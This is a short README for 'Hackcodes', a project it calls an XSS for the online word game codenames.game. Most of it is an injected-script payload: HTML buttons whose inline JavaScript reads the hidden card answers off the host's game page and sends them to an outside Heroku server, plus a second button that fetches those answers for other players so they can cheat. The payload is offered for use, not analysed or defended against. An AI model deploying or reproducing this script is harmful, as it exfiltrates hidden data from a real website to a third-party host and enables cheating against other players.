# Hackcodes

This is a website created to support an XSS for https://codenames.game/.

## Script

`<button onclick="javascript:((function() {var a = document.querySelectorAll('.blue');var arr = [];for(b of a) { if(b.classList.contains('cardImage')) {var c = b.nextElementSibling;arr.push(c.innerText);};};window.open(`https:\/\/hackcodes.herokuapp.com/codenamesadd/${window.location.pathname.replace('/room/', '')}?answers=${arr.join(',')}`,'_blank');})())">Create Object (HOST)</button>
<button onclick="javascript:((function() {window.open(`https:\/\/hackcodes.herokuapp.com/codenames/${window.location.pathname.replace('/room/', '')}`,'_blank');})())">Get answers (OPERADOR)</button>`

Please be aware that you can change the class from .blue to .red or anything if needed.

-

zF4ke#8556
